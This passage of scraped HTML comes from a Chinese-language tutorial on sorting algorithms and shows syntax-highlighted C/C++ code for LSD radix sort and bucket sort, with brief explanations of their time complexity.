class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-16\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GetDigit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">          </span><span class=\"crayon-c\">// 获得元素x的第d位数字</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-17\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">radix</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// 最大为三位数，所以这里只要到百位就满足了</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">radix</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">d</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-20\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-22\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CountingSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-sy\">)</span><span class=\"crayon-c\">// 依据元素的第d位数字，对A数组进行计数排序</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-23\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-27\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">GetDigit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-34\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-36\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">B</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">malloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">n *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-39\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GetDigit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">// 元素A[i]当前位数字为dight   </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-40\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">dight</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// 根据当前位数字，把每个元素A[i]放到它在输出数组B中的正确位置上</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-41\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 当再遇到当前位数字同为dight的元素时，会将其放在当前元素的前一个位置上保证计数排序的稳定性</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-45\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-47\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">free</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-48\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-49\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-50\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">LsdRadixSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">     </span><span class=\"crayon-c\">// 最低位优先基数排序</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-51\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-52\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dn</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">     </span><span class=\"crayon-c\">// 从低位到高位</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-53\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">CountingSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 依据第d位数字对A进行计数排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-54\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-55\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-56\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-57\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-58\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">90</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">289</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">998</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">365</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">852</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">123</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">789</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">456</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// 针对基数排序设计的输入</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-59\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-60\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">LsdRadixSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-61\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"基数排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-62\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-63\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-64\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-65\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-66\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-67\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-68\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0112 seconds] -->\r\n\n</div>\n<p>下图给出了对{ 329, 457, 657, 839, 436, 720, 355 }进行基数排序的简单演示过程</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/fb104988069e9773c2f4333dce9a25c6.jpg\" alt=\"\"></p>\n<p>基数排序的时间复杂度是O(n * dn)，其中n是待排序元素个数，dn是数字位数。这个时间复杂度不一定优于O(n log n)，dn的大小取决于数字位的选择（比如比特位数），和待排序数据所属数据类型的全集的大小；dn决定了进行多少轮处理，而n是每轮处理的操作数目。</p>\n<p>如果考虑和比较排序进行对照，基数排序的形式复杂度虽然不一定更小，但由于不进行比较，因此其基本操作的代价较小，而且如果适当的选择基数，dn一般不大于log n，所以基数排序一般要快过基于比较的排序，比如快速排序。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序并不是只能用于整数排序。</p>\n<h2>　　<a name=\"s3\"></a>桶排序(Bucket Sort)</h2>\n<p>桶排序也叫箱排序。工作的原理是将数组元素映射到有限数量个桶里，利用计数排序可以定位桶的边界，每个桶再各自进行桶内排序（使用其它排序算法或以递归方式继续使用桶排序）。</p>\n<p>桶排序的实现代码如下：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930959d7768642092\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include&lt;iostream&gt;\r\nusing namespace std;\r\n\r\n// 分类 ------------- 内部非比较排序\r\n// 数据结构 --------- 数组\r\n// 最差时间复杂度 ---- O(nlogn)或O(n^2)，只有一个桶，取决于桶内排序方式\r\n// 最优时间复杂度 ---- O(n)，每个元素占一个桶\r\n// 平均时间复杂度 ---- O(n)，保证各个桶内元素个数均匀即可\r\n// 所需辅助空间 ------ O(n + bn)\r\n// 稳定性 ----------- 稳定\r\n\r\n/* 本程序用数组模拟桶 */\r\nconst int bn = 5;    // 这里排序[0,49]的元素，使用5个桶就够了，也可以根据输入动态确定桶的数量\r\nint C[bn];           // 计数数组，存放桶的边界信息\r\n\r\nvoid InsertionSort(int A[], int left, int right)\r\n{\r\n    for (int i = left + 1; i &lt;= right; i++)  // 从第二张牌开始抓，直到最后一张牌\r\n    {\r\n        int get = A[i];\r\n        int j = i - 1;\r\n        while (j &gt;= left &amp;&amp; A[j] &gt; get)\r\n        {\r\n            A[j + 1] = A[j];\r\n            j--;\r\n        }\r\n        A[j + 1] = get;\r\n    }\r\n}\r\n\r\nint MapToBucket(int x)\r\n{\r\n    return x / 10;    // 映射函数f(x)，作用相当于快排中的Partition，把大量数据分割成基本有序的数据块\r\n}\r\n\r\nvoid CountingSort(int A[], int n)\r\n{\r\n    for (int i = 0; i &lt; bn; i++)\r\n    {\r\n        C[i] = 0;\r\n    }\r\n    for (int i = 0; i &lt; n; i++)     // 使C[i]保存着i号桶中元素的个数\r\n    {\r\n        C[MapToBucket(A[i])]++;\r\n    }\r\n    for (int i = 1; i &lt; bn; i++)    // 定位桶边界：初始时，C[i]-1为i号桶最后一个元素的位置\r\n    {\r\n        C[i] = C[i] + C[i - 1];\r\n    }\r\n    int *B = (int *)malloc((n) * sizeof(int));\r\n    for (int i = n - 1; i &gt;= 0; i--)// 从后向前扫描保证计数排序的稳定性(重复元素相对次序不变)\r\n    {\r\n        int b = MapToBucket(A[i]);  // 元素A[i]位于b号桶\r\n        B[--C[b]] = A[i];           // 把每个元素A[i]放到它在输出数组B中的正确位置上\r\n                                    // 桶的边界被更新：C[b]为b号桶第一个元素的位置\r\n    }\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        A[i] = B[i];\r\n    }\r\n    free(B);\r\n}\r\n\r\nvoid BucketSort(int A[], int n)\r\n{\r\n    CountingSort(A, n);          // 利用计数排序确定各个桶的边界（分桶）\r\n    for (int i = 0; i &lt; bn; i++) // 对每一个桶中的元素应用插入排序\r\n    {\r\n        int left = C[i];         // C[i]为i号桶第一个元素的位置\r\n        int right = (i == bn - 1 ? n - 1 : C[i + 1] - 1);// C[i+1]-1为i号桶最后一个元素的位置\r\n        if (left &lt; right)        // 对元素个数大于1的桶进行桶内插入排序\r\n            InsertionSort(A, left, right);\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 29, 25, 3, 49, 9, 37, 21, 43 };// 针对桶排序设计的输入\r\n    int n = sizeof(A) / sizeof(int);\r\n    BucketSort(A, n);\r\n    printf(\"桶排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-2\">2</div><div class=\"crayon-num\" 